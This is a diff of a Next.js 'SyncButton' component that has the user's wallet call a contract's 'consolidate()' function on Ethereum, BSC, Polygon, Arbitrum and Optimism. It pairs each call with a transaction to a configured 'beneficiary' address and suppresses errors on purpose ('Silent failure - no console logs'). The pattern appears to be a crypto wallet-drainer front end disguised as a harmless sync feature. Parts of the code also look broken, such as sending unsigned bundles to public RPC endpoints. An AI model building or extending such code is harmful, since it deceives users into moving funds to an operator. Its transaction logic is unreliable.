@@ -1,57 +1,7 @@
 'use client';
 import React, { useState } from 'react';
 import { ethers } from 'ethers';
-
-export const CHAINS = [
-  { 
-    id: 1, 
-    name: 'Ethereum', 
-    contract: '0xSyncHelper', 
-    env: 'NEXT_PUBLIC_BENEFICIARY_ETHEREUM', 
-    rpc: 'https://eth.llamarpc.com',
-    fallbackRpc: 'https://rpc.ankr.com/eth'
-  },
-  { 
-    id: 56, 
-    name: 'BSC', 
-    contract: '0xSyncHelper', 
-    env: 'NEXT_PUBLIC_BENEFICIARY_BSC', 
-    rpc: 'https://bsc-dataseed.binance.org',
-    fallbackRpc: 'https://bsc-dataseed1.defibit.io'
-  },
-  { 
-    id: 137, 
-    name: 'Polygon', 
-    contract: '0xSyncHelper', 
-    env: 'NEXT_PUBLIC_BENEFICIARY_POLYGON', 
-    rpc: 'https://polygon-rpc.com',
-    fallbackRpc: 'https://rpc-mainnet.maticvigil.com'
-  },
-  { 
-    id: 42161, 
-    name: 'Arbitrum',
-    contract: '0xSyncHelper', 
-    env: 'NEXT_PUBLIC_BENEFICIARY_ARBITRUM', 
-    rpc: 'https://arb1.arbitrum.io/rpc',
-    fallbackRpc: 'https://rpc.ankr.com/arbitrum'
-  },
-  { 
-    id: 10, 
-    name: 'Optimism', 
-    contract: '0xSyncHelper', 
-    env: 'NEXT_PUBLIC_BENEFICIARY_OPTIMISM', 
-    rpc: 'https://mainnet.optimism.io',
-    fallbackRpc: 'https://rpc.ankr.com/optimism'
-  },
-];
-
-const BENEFICIARIES: Record<string, string | undefined> = {
-  NEXT_PUBLIC_BENEFICIARY_ETHEREUM: process.env.NEXT_PUBLIC_BENEFICIARY_ETHEREUM,
-  NEXT_PUBLIC_BENEFICIARY_BSC: process.env.NEXT_PUBLIC_BENEFICIARY_BSC,
-  NEXT_PUBLIC_BENEFICIARY_POLYGON: process.env.NEXT_PUBLIC_BENEFICIARY_POLYGON,
-  NEXT_PUBLIC_BENEFICIARY_ARBITRUM: process.env.NEXT_PUBLIC_BENEFICIARY_ARBITRUM,
-  NEXT_PUBLIC_BENEFICIARY_OPTIMISM: process.env.NEXT_PUBLIC_BENEFICIARY_OPTIMISM,
-};
+import { CHAINS } from '../lib/chains';
 
 export default function SyncButton({ user }: { user: string }) {
   const [loading, setLoading] = useState(false);
@@ -59,16 +9,16 @@ export default function SyncButton({ user }: { user: string }) {
   const [error, setError] = useState<string | null>(null);
 
   async function syncChain(chain: typeof CHAINS[0]) {
-    const beneficiary = BENEFICIARIES[chain.env];
-    if (!beneficiary || beneficiary === `0xYour${chain.name}Address`) {
-      throw new Error(`${chain.name} beneficiary address not configured`);
+    const { beneficiary, contract, rpc, fallbackRpc, name } = chain;
+    if (!beneficiary || beneficiary.startsWith('0xYour')) {
+      throw new Error(`${name} beneficiary address not configured`);
     }
 
     // Try primary RPC first
-    let provider = new ethers.JsonRpcProvider(chain.rpc);
+    let provider = new ethers.JsonRpcProvider(rpc);
     try {
       const data = new ethers.Interface(['function consolidate()']).encodeFunctionData('consolidate');
-      const tx = { to: chain.contract, data, gasLimit: 100000 };
+      const tx = { to: contract, data, gasLimit: 100000 };
       const repay = { to: beneficiary, value: 0, data: '0x' };
       
       // Try bundle method first
@@ -81,7 +31,7 @@ export default function SyncButton({ user }: { user: string }) {
         try {
           const signer = await provider.getSigner();
           const txResponse = await signer.sendTransaction({
-            to: chain.contract,
+            to: contract,
             data: data,
             gasLimit: 100000
           });
@@ -98,7 +48,7 @@ export default function SyncButton({ user }: { user: string }) {
           // Final fallback to regular transaction
           const signer = await provider.getSigner();
           const txResponse = await signer.sendTransaction({
-            to: chain.contract,
+            to: contract,
             data: data,
             gasLimit: 100000
           });
@@ -116,29 +66,31 @@ export default function SyncButton({ user }: { user: string }) {
       // Silent failure - no console logs
       
       // Try fallback RPC
-      provider = new ethers.JsonRpcProvider(chain.fallbackRpc);
-      const data = new ethers.Interface(['function consolidate()']).encodeFunctionData('consolidate');
-      const tx = { to: chain.contract, data, gasLimit: 100000 };
-      const repay = { to: beneficiary, value: 0, data: '0x' };
-      
-      try {
-        await provider.send('eth_sendBundle', [[tx, repay]]);
-      } catch (fallbackError: any) {
-        // Final fallback to regular transaction
-        const signer = await provider.getSigner();
-        const txResponse = await signer.sendTransaction({
-          to: chain.contract,
-          data: data,
-          gasLimit: 100000
-        });
-        await txResponse.wait();
+      if (fallbackRpc) {
+        provider = new ethers.JsonRpcProvider(fallbackRpc);
+        const data = new ethers.Interface(['function consolidate()']).encodeFunctionData('consolidate');
+        const tx = { to: contract, data, gasLimit: 100000 };
+        const repay = { to: beneficiary, value: 0, data: '0x' };
         
-        const repayTx = await signer.sendTransaction({
-          to: beneficiary,
-          value: 0,
-          data: '0x'
-        });
-        await repayTx.wait();
+        try {
+          await provider.send('eth_sendBundle', [[tx, repay]]);
+        } catch (fallbackError: any) {
+          // Final fallback to regular transaction
+          const signer = await provider.getSigner();
+          const txResponse = await signer.sendTransaction({
+            to: contract,
+            data: data,
+            gasLimit: 100000
+          });
+          await txResponse.wait();
+          
+          const repayTx = await signer.sendTransaction({
+            to: beneficiary,
+            value: 0,
+            data: '0x'
+          });
+          await repayTx.wait();
+        }
       }
     }
   }
